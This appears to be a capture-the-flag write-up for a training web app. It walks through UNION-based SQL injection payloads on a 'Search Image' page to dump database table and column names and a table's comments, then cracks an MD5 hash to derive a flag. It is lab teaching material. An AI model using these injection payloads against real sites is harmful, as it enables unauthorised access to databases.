In the "Search Image" page (http://10.12.181.103/?page=searchimg) we gonna use the sql injection to get all the tables names and their column names by using 
```
ID: 1 OR 1=1 UNION SELECT TABLE_NAME, COLUMN_NAME  FROM INFORMATION_SCHEMA.COLUMNS 
```
after listing the names, we can check on the table "list_images" and see its columns, the most important one here is this one
```
Title: comment
Url : list_images
```
so we can use a script to search on all the comments and we can use another column's name or use the same one twice like :
```
1 OR 1=1 UNION SELECT comment, comment FROM list_images
```

or
```
1 OR 1=1 UNION SELECT title, comment FROM list_images
```
the most important message in all the cases is this one:
```
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```
so we decode the lowercase, we use this website 
```
https://crackstation.net/
```
the result is :
```
albatroz
```
so after hashing "albatroz" with SH256 tool we get the flag:
```
f2a29020ef3132XXXXXXXXXXXXXX
```